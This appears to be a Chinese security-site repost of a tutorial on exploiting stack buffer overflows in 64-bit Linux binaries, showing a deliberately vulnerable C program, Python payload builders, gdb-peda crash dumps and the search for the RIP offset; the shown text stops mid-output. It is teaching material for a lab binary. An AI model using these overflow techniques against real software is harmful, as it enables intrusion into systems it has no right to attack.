<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>64位Linux栈溢出教程 - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="&nbsp;" />
<meta name="keywords" content="0x7fffffffeefa,anquanmaibo,ASLR,Classic stack smashing,Deily,execstack,gadget,GDB,gdb-peda,getenvaddr,getenvaddr.c,koji@pwnbox,NX机制,pwnbox,ret2libc,Ropper,SHELLCODE,stack canaries,vuln(),二进制程序,安全脉搏,崩栈例子,控制RIP,缓冲区溢出,覆盖RIP,配置错误" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/32328.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-32328 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/news" rel="category tag">资讯</a> &gt;  正文 </nav><article id="post-32328" class="post-32328 post type-post status-publish format-standard hentry category-news tag-45434 tag-anquanmaibo tag-aslr tag-classic-stack-smashing tag-deily tag-execstack tag-gadget tag-gdb tag-gdb-peda tag-getenvaddr tag-getenvaddr-c tag-kojipwnbox tag-nx tag-pwnbox tag-ret2libc tag-ropper tag-shellcode tag-stack-canaries tag-vuln tag-45427 tag-319 tag-45423 tag-rip tag-3284 tag-3803">
	<header class="single-header">
		<h1>64位Linux栈溢出教程</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2015 /5/28 21:12</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">7,983</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/32328.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<p>&nbsp;</p>
<h2>0x01</h2>
<p>这一系列的文章目的在于快速介绍对缓冲区溢出（在64位下linux二进制程序）弱点的利用。</p>
<p>该系列教程适合人群为：熟悉利用32位二进制程序并想应用它们的知识来利用64位二进制程序。</p>
<p>该教程是长期的零散笔记，整理总结成的结果。</p>
<h2>搭建环境</h2>
<p>在64位与32位linux平台下编写其二进制的利用程序区别不大,然而我们将遇到一些陷阱,学习这种技术最好的方法是实践它,因此我鼓励你跟着教程一起实践。</p>
<p>我将在<a href="http://cdimage.ubuntu.com/netboot/14.10/" target="_blank">Unbuntu14.10</a>下编译有弱点的二进制且编写利用程序，我也将提供预编译的二进制程序。这篇教程将使用如下工具:</p>
<ul>
<li><a href="https://github.com/longld/peda" target="_blank">Python Exploit Development Assistance for GDB</a></li>
<li><a href="https://gist.github.com/superkojiman/6a6e44db390d6dfc329a" target="_blank">getenvaddr.c</a></li>
</ul>
<h2>64位,你需了解些什么</h2>
<p>为了学习这篇教程,你应该知道如下几点：</p>
<ul>
<li>被扩展到64位的通用寄存器为：RAX，RBX，RCX，RDX，RSI和RDI</li>
<li>被扩展为64位的指令指针,基地址指针,栈指针分别为RIP，RBP和RSP</li>
<li>提供的额外寄存器:R8到R15</li>
<li>8字节宽的指针</li>
<li>在栈上push/pop为8字节宽</li>
<li>地址最大的标准大小为0x00007FFFFFFFFFFF</li>
<li>通过寄存器传递函数的参数</li>
</ul>
<p>知道更多信息当然很棒,所以尽情google搜寻关于64位架构和汇编编程的信息吧,<a href="http://en.wikipedia.org/wiki/X86-64" target="_blank">Wikipedia</a>有一篇简短的文章值得一读.</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/iStock-hacker.jpg"><img class="alignnone size-full wp-image-32378" src="http://www.secpulse.com/wp-content/uploads/2015/05/iStock-hacker.jpg" alt="iStock-hacker" width="950" height="534" /></a></p>
<h2>典型的崩栈例子</h2>
<p>让我们开始于一个典型的崩栈例子,我们将关闭ASLR,NX,和stack canaries保护机制，因此我们可以专注真实的利用。</p>
<p>有弱点的二进制程序源码如下:</p>
<pre>/* Compile: gcc -fno-stack-protector -z execstack classic.c -o classic */
/* Disable ASLR: echo 0 &gt; /proc/sys/kerne/randomize_va_space */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int vuln() {
 char buf[80];
 int r;
 r = read(0, buf, 400);
 printf("\nRead %d bytes. buf is %s\n", r, buf);
 puts("No shell for you :(");
 return 0;
}

int main(int argc, char *argv[]) {
 printf("Try to exec /bin/sh");
 vuln();
 return 0;
}
</pre>
<p>你也可以在<a href="https://gist.github.com/superkojiman/595524f6b96c79380568" target="_blank">这里</a>获取预编译好的二进制程序</p>
<p>当read()将400字节复制到一个80字节的buffer时,显然在vuln()中存在缓冲区溢出弱点。</p>
<p>因此从技术角度看,如果我们将400个字节传递到其中，我们应该可以溢出缓冲区并用我们的payload覆盖RIP,对吗？构造一段exploit内容如下：</p>
<pre>#!/usr/bin/env python
buf = ""
buf += "A"*400

f = open("in.txt", "w")
f.write(buf)
</pre>
<p>这个脚本将创建一个命名为”in.txt”的文件（含有400个“A”字符），我们将典例加载进gdb并将in.txt的内容重定向到典例中,同时我们看看是否可以覆盖RIP：</p>
<pre>gdb-peda$ r &lt; in.txt

Try to exec /bin/sh

Read 400 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�

No shell for you :(

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]

RAX: 0x0

RBX: 0x0

RCX: 0x7ffff7b015a0 (&lt;__write_nocancel+7&gt;:  cmp    rax,0xfffffffffffff001)

RDX: 0x7ffff7dd5a00 --&gt; 0x0

RSI: 0x7ffff7ff5000 ("No shell for you :(\nis ", 'A' &lt;repeats 92 times&gt;"\220, \001\n")

RDI: 0x1

RBP: 0x4141414141414141 ('AAAAAAAA')

RSP: 0x7fffffffe508 ('A' &lt;repeats 200 times&gt;...)

RIP: 0x40060f (&lt;vuln+73&gt;:   ret)

R8 : 0x283a20756f792072 ('r you :(')

R9 : 0x4141414141414141 ('AAAAAAAA')

R10: 0x7fffffffe260 --&gt; 0x0

R11: 0x246

R12: 0x4004d0 (&lt;_start&gt;:    xor    ebp,ebp)

R13: 0x7fffffffe600 ('A' &lt;repeats 48 times&gt;, "|\350\377\377\377\177")

R14: 0x0

R15: 0x0

EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)

[-------------------------------------code-------------------------------------]

0x400604 &lt;vuln+62&gt;:  call   0x400480 &lt;puts@plt&gt;

0x400609 &lt;vuln+67&gt;:  mov    eax,0x0

0x40060e &lt;vuln+72&gt;:  leave

=&gt; 0x40060f &lt;vuln+73&gt;:  ret

0x400610 &lt;main&gt;: push   rbp

0x400611 &lt;main+1&gt;:   mov    rbp,rsp

0x400614 &lt;main+4&gt;:   sub    rsp,0x10

0x400618 &lt;main+8&gt;:   mov    DWORD PTR [rbp-0x4],edi

[------------------------------------stack-------------------------------------]

0000| 0x7fffffffe508 ('A' &lt;repeats 200 times&gt;...)

0008| 0x7fffffffe510 ('A' &lt;repeats 200 times&gt;...)

0016| 0x7fffffffe518 ('A' &lt;repeats 200 times&gt;...)

0024| 0x7fffffffe520 ('A' &lt;repeats 200 times&gt;...)

0032| 0x7fffffffe528 ('A' &lt;repeats 200 times&gt;...)

0040| 0x7fffffffe530 ('A' &lt;repeats 200 times&gt;...)

0048| 0x7fffffffe538 ('A' &lt;repeats 200 times&gt;...)

0056| 0x7fffffffe540 ('A' &lt;repeats 200 times&gt;...)

[------------------------------------------------------------------------------]

Legend: code, data, rodata, value

Stopped reason: SIGSEGV

0x000000000040060f in vuln ()

</pre>
<p>因此程序正如意料中的那样崩掉了，但是毫无意义。因为我们已覆盖的RIP带有一个无效地址，事实上我们没控制到RIP。因为我更早意识到最大地址是0x00007FFFFFFFFFFF。我们可以用一个非标准地址(0x0000414141414141)覆盖RIP（将造成处理器发生异常）.为了控制RIP，我们需要用0x0000414141414141覆盖(代替)它，因此真正的目标是找到覆盖了RIP的偏移（带有一个非标准地址）。我们可以使用一种cyclic模板找到这个偏移：</p>
<pre>gdb-peda$ pattern_create 400 in.txt

Writing pattern of 400 chars to filename "in.txt"
</pre>
<p>让我们再次运行它并检查RSP的内容:</p>
<pre>gdb-peda$ r &lt; in.txt

Try to exec /bin/sh

Read 400 bytes. buf is AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKA�

No shell for you :(

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]

RAX: 0x0

RBX: 0x0

RCX: 0x7ffff7b015a0 (&lt;__write_nocancel+7&gt;:  cmp    rax,0xfffffffffffff001)

RDX: 0x7ffff7dd5a00 --&gt; 0x0

RSI: 0x7ffff7ff5000 ("No shell for you :(\nis AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKA\220\001\n")

RDI: 0x1

RBP: 0x416841414c414136 ('6AALAAhA')

RSP: 0x7fffffffe508 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6"...)

RIP: 0x40060f (&lt;vuln+73&gt;:   ret)

R8 : 0x283a20756f792072 ('r you :(')

R9 : 0x4147414131414162 ('bAA1AAGA')

R10: 0x7fffffffe260 --&gt; 0x0

R11: 0x246

R12: 0x4004d0 (&lt;_start&gt;:    xor    ebp,ebp)

R13: 0x7fffffffe600 ("A%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%Z|\350\377\377\377\177")

R14: 0x0

R15: 0x0

EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)

[-------------------------------------code-------------------------------------]

0x400604 &lt;vuln+62&gt;:  call   0x400480 &lt;puts@plt&gt;

0x400609 &lt;vuln+67&gt;:  mov    eax,0x0

0x40060e &lt;vuln+72&gt;:  leave

=&gt; 0x40060f &lt;vuln+73&gt;:  ret

0x400610 &lt;main&gt;: push   rbp

0x400611 &lt;main+1&gt;:   mov    rbp,rsp

0x400614 &lt;main+4&gt;:   sub    rsp,0x10

0x400618 &lt;main+8&gt;:   mov    DWORD PTR [rbp-0x4],edi

[------------------------------------stack-------------------------------------]

0000| 0x7fffffffe508 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6"...)

0008| 0x7fffffffe510 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%"...)

0016| 0x7fffffffe518 ("jAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA"...)

0024| 0x7fffffffe520 ("AkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%j"...)

0032| 0x7fffffffe528 ("AAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%"...)

0040| 0x7fffffffe530 ("RAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA"...)

0048| 0x7fffffffe538 ("AoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%R"...)

0056| 0x7fffffffe540 ("AAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%"...)
</pre>
<p>[------------------------------------------------------------------------------]</p>
<p>我们可以清晰地在栈上看到我们的cyclic模板.让我们找到偏移：</p>
<pre>gdb-peda$ x/wx $rsp

0x7fffffffe508: 0x41413741

gdb-peda$ pattern_offset 0x41413741

1094793025 found at offset: 104
</pre>
<p>因此,RIP在偏移104上.让我们更新我们的利用程序并看看我们这次是否可以覆盖RIP:</p>
<pre>#!/usr/bin/env python

from struct import *

buf = ""

buf += "A"*104                      # offset to RIP

buf += pack("&lt;Q", 0x424242424242)   # overwrite RIP with 0x0000424242424242

buf += "C"*290                      # padding to keep payload length at 400 bytes

f = open("in.txt", "w")

f.write(buf)
</pre>
<p>运行它以创建一个已更新的in.txt文件,然后将其重定向在gdb内的程序中:</p>
<pre>gdb-peda$ r &lt; in.txt

Try to exec /bin/sh

Read 400 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�

No shell for you :(

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]

RAX: 0x0

RBX: 0x0

RCX: 0x7ffff7b015a0 (&lt;__write_nocancel+7&gt;:  cmp    rax,0xfffffffffffff001)
